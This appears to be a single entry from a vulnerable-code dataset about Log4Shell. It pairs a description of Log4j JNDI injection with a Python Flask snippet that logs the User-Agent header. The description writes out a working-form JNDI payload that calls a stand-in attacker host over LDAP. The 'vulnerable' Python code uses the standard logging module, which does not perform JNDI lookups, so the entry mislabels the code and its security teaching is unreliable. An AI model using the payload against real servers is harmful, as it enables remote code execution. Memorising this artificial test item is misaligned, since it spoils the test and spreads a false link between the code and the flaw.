name: Log4Shell
description: Log4j2 JNDI injection via user-controlled string logged with log4j. When a log call includes user input (e.g., HTTP headers like User-Agent or X-Forwarded-For), Log4j interprets ${jndi:ldap://attacker.com/a} as a lookup and makes an outbound LDAP connection, enabling RCE.
spec: Write a Python web service that logs incoming HTTP requests including the User-Agent header for debugging purposes.
vulnerable_code:
import logging
from flask import Flask, request
app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

@app.route('/')
def index():
    user_agent = request.headers.get('User-Agent', '')
    logging.info(f'Request from: {user_agent}')  # vulnerable: logs unvalidated input
    return 'OK'
